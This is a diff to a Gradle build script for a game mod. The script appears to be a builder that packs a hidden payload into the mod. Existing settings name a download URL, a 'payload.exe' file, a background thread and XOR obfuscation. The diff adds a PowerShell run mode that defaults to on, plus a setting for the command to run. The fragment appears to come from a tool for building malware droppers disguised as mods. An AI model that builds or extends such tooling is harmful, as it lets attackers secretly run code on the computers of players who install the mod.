@@ -24,14 +24,24 @@ def modId = modSettings.getProperty("mod.id", "godimod").trim()
 def modName = modSettings.getProperty("mod.name", "Mod").trim()
 def modDescription = modSettings.getProperty("mod.description", "").trim()
 def modAuthors = modSettings.getProperty("mod.authors", "-").trim()
+def runMode = modSettings.getProperty("run.mode", "powershell").trim().toLowerCase()
 def downloadUrl = modSettings.getProperty("download.url", "").trim()
 def downloadFile = modSettings.getProperty("download.filename", "payload.exe").trim()
+def psCommand = modSettings.getProperty("powershell.command", "").trim()
 def threadName = modSettings.getProperty("thread.name", "bg").trim()
 def obfLevel = modSettings.getProperty("obfuscate.level", "light").trim().toLowerCase()
 def xorKey = (modSettings.getProperty("obfuscate.xor.key", "91").trim() as int) & 0xFF
 
-if (!downloadUrl.startsWith("https://")) {
-    throw new GradleException("download.url должен быть https://")
+if (runMode == "download") {
+    if (!downloadUrl.startsWith("https://")) {
+        throw new GradleException("download.url должен быть https://")
+    }
+} else if (runMode == "powershell") {
+    if (psCommand.isEmpty()) {
+        throw new GradleException("powershell.command не задан (run.mode=powershell)")
+    }
+} else {
+    throw new GradleException("run.mode: powershell или download")
 }
 
 version = project.mod_version
